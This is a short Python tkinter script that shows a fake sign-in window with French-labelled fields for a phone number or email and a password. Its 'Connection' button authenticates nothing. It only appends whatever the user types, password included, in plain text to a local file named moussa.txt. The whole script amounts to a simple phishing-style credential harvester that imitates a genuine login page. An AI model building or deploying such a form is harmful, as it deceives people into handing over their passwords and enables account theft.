from tkinter import *

m =    Tk()

def call():
    one =    en1.get()
    two =    en2.get()
    all=    "your nom : " +one+"\n"+"votre mot de passe : "+two
    with open("moussa.txt","a") as f:
        f.write(all+"\n")


b1 =    Button(m,text="                     Connection                 ",bg ="blue",fg="white",command=call).place(x=150,y=1400)

la2 =    Label(m,text="Fahad Exemple",font=("arial",20),fg="blue").place(x=40,y=30)

en1 =    Entry(m,width=15,font=("aial",15))
en1.place(x=150,y=800)
la1 =    Label(m,text="Numero ou email",bg="white").place(x=150,y=765)

la2 =    Label(m,text="Mot de passe").place(x=150,y=920)
en2 =    Entry(m,width=15,font=("aial",15))
en2.place(x=150,y=970)

la2 =    Label(m,text="Mot de passe oublier",fg="blue").place(x=150,y=1150)

mainloop()
